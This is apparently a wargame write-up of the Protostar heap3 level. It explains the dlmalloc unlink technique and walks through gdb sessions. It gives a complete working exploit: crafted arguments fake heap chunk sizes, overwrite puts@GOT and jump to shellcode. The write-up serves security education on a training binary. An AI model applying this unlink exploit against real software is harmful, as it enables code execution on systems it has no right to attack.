We are almost finishing the heap series, and now we start doing some Doug Lea malloc algorithm exploitation. This is what the web says:

"This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution."

And the code is in here:

#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}


To exploit this binary, we will use technique known as "unlink" that take advantage of the macro called by "free", as the doug lea algorithm doesn't allow two adjacent free heap chunks, in the moment of doing free, it takes the chunk that is before or after the one to free, and check if it's also free, if it's free and it is inside of a bin (list of free chunks of same size), and also BEFORE JOINING THE TWO CHUNKS, it has to remove that from the bin, to do that it uses the macro "unlink", that using the heap structure:

struct malloc_chunk {
	INTERNAL_SIZE_T prev_size;
	INTERNAL_SIZE_T size;
	struct malloc_chunk * fd;
	struct malloc_chunk * bk;
}


And the unlink macro:

#define unlink ( P, BK, FD ) { \
	BK = P->bk;                \
	FD = P->fd;                \
	FD->bk = BK;               \
	BK->fd = FD;               \
}

Being:

* P: the chunk to remove from the bin (not the one to free, the previous or the next).
* BK: the previous heap chunk from P on its bin.
* fd: the next heap chunk from P on its bin.

So if we are going to free a heap chunk, and we can modify the values "bk" and "fd" from the next we could make unlink to replace a pointer (writing using the dlmalloc macro), but that chunk we want to modify, it should says "I'm free", and this is done with a field "size" of a third chunk, if the last bit of a third chunk size is 0 it means the second is free, in case it is 1 it means the second is not free. As we have three chunks here, we can make this in two ways:

How to write with this technique?:

As we can see the macro writes in FD->bk, and in BK->fd, being this in assembly [FD+12] and [BK+8], so if we for example want to write in the address "0xC", we should write in FD the value 0, so [0 + 12] it's the address where we want to write, but also, whatever address we put in BK, that address plus 8 will be written. 

So for example if we want to write in a GOT address, we should set fd with GOT - 12, and BK equals to the address of a shellcode:

BK = &shellcode
FD = GOT_ADDRESS - 12

FD->bk = BK  ==> FD->bk = &shellcode ==> [FD + 12] = &shellcode ==> [GOT_ADDRESS - 12 + 12] = &shellcode

So we could write a shellcode address (for example the pointer of the chunk a) into an address we want, for example a GOT of a function to be executed, but we have a problem, as BK is a shellcode, BK+8 will be written, so what we have to do, is to write 4 bytes of trash in shellcode + 8 and a jump writing 12 bytes at the beginning of the shellcode.

      +------------------+
      |                  |
      +                  v
jmp 0xC     AAAAAAAA     shellcode_code

BK = &shellcode
FD = GOT_ADDRESS - 12

BK->fd = FD  ==> BK->fd = GOT_ADDRESS - 12  ==> [BK + 8] = GOT_ADDRESS - 12  ==> [&shellcode + 8] = GOT_ADDRESS - 12



So let's going to extract from the execution the addresses from a, b and c to calculate sizes for the string, once we do that, we have to see which shellcode to use, and new sizes. The pointer we get from malloc, is not the one that points to beginning of the structure but the one that points to fd (as fd and bk are only used on free chunks there start the real data), so we have to substract from that the size of the structure.

Let's gonna go to protostar machine and run heap3 with gdb:

	$ gdb -q ./heap3
	> b main
	> b *0x0804889e # set breakpoint after first malloc
	> b *0x080488ae # set breakpoint after second malloc
	> b *0x080488be # set breakpoint after third malloc

We execute, and get info from the registers (specifically from register eax) to get the malloc address:

a = 0x804c008
b = 0x804c030
c = 0x804c058

In this case, in the code we have that the buffers are freed in reverse-order, we can modify the size and prevsize from "b" and from "c", so in the moment one of those buffers are freed, we could make think the algorithm that the previous chunk is free, creating a fake chunk. So if we set:

c->size = 0xfffffffc

The algorithm would think that the previous block is free (because in -4, the last bit is zero), and how will calculate the algorithm where is the previous chunk?

&c - prevsize

So what happen if we set prevsize to -4 (0xfffffffc)

&c - prevsize = &c - (-4) = &c + 4

So the created fake chunk, it would start in the pointer where c->size is, so we would have something like this:

        0           3            7           11           15

        +-----------+------------+------------+------------+
        |           |            |            |            |
c       | prevsize  |  size      |    fd      |    bk      |
        |           |            |            |            |
        +-----------+------------+------------+------------+


                    +------------+------------+------------+-------------+
                    |            |            |            |             |
          fake      | prefsize   |  size      |  fd        |  bk         |
                    |            |            |            |             |
                    +------------+------------+------------+-------------+

So if we set c->prevsize = 0xfffffffc, c->size = 0xfffffffc, we should set c->fd to whatever (4 bytes of junk), c->bk will be the fake->fd = got_address - 12, and c->data will be fake->bk = &shellcode

The shellcode could be anywhere, for example we could write the shellcode in "b", also this same theory could be applied to "b":

        0           3            7           11           15

        +-----------+------------+------------+------------+
        |           |            |            |            |
b       | prevsize  |  size      |    fd      |    bk      |
        |           |            |            |            |
        +-----------+------------+------------+------------+


                    +------------+------------+------------+-------------+
                    |            |            |            |             |
          fake      | prefsize   |  size      |  fd        |  bk         |
                    |            |            |            |             |
                    +------------+------------+------------+-------------+

So in this case we would create a fake chunk previous to "b". If we do the first option, modifying "c" we would apply the write in GOT with the instruction free(c), but if we apply the modification in "b", the write in GOT will be with the instruction free(b).

We can dump with gdb all the memory from "a" to see what we have:

(gdb) x/30x 0x804c008
0x804c008:	0x0804c028	0x00000000	0x00000000	0x00000000
0x804c018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c028:	0x00000000	0x00000029	0x0804c050	0x00000000
0x804c038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c048:	0x00000000	0x00000000	0x00000000	0x00000029
0x804c058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c078:	0x00000000	0x00000f89


We can write whatever we want in "a", and write in "b" the shellcode, junk, and then the modification of c->prevsize, and c->size, then in c, we will write 4 bytes of junk, the fake->fd (got_address - 12) and fake->bk (&shellcode = "b")


fake->fd = puts@got - 12 = 0x804b128 - 12 = 0x804b11c
fake->bk = "b" = 0x804c030

a = "whatever"
b = python -c "print 'a'*10 + '\x68\x64\x88\x04\x08\xc3' + 'a'*(32-len('\x68\x64\x88\x04\x08\xc3') - 10) + '\xfc\xff\xff\xff' + '\xfc\xff\xff\xff'"
c = python -c "print 'a'*4 + '\x1c\xb1\x04\x08' + '\x3a\xc0\x04\x08'"

./heap3 whatever `python -c "print 'a'*10 + '\x68\x64\x88\x04\x08\xc3' + 'a'*(32-len('\x68\x64\x88\x04\x08\xc3') - 10) + '\xfc\xff\xff\xff' + '\xfc\xff\xff\xff'"` `python -c "print 'a'*4 + '\x1c\xb1\x04\x08' + '\x3a\xc0\x04\x08'"`

So we are writing some padding in "b", we write a "push 0x08048864;ret" shellcode, more junk until we get c->prevsize and c->size, that we modify both with -4, after that we write the data for fake, fake->size that will be -4, then fake->fd and fake->bk.

As we are doing the unlink technique with "c", if we check after the first "free(c)", we can see memory and check that the change was done:

$ gdb ./heap3
(gdb) b *0x08048916
(gdb) r whatever `python -c "print 'a'*10 + '\x68\x64\x88\x04\x08\xc3' + 'a'*(32-len('\x68\x64\x88\x04\x08\xc3') - 10) + '\xfc\xff\xff\xff' + '\xfc\xff\xff\xff'"` `python -c "print 'a'*4 + '\x1c\xb1\x04\x08' + '\x3a\xc0\x04\x08'"`
(gdb) x/1x 0x804b128
0x804b128 <_GLOBAL_OFFSET_TABLE_+64>:	0x0804c03a
(gdb) c
Continuing.
that wasn't too bad now, was it? @ 1590084554

Program exited with code 056.

As we can see the puts@GOT, was modified, and set to the value we gave, our shellcode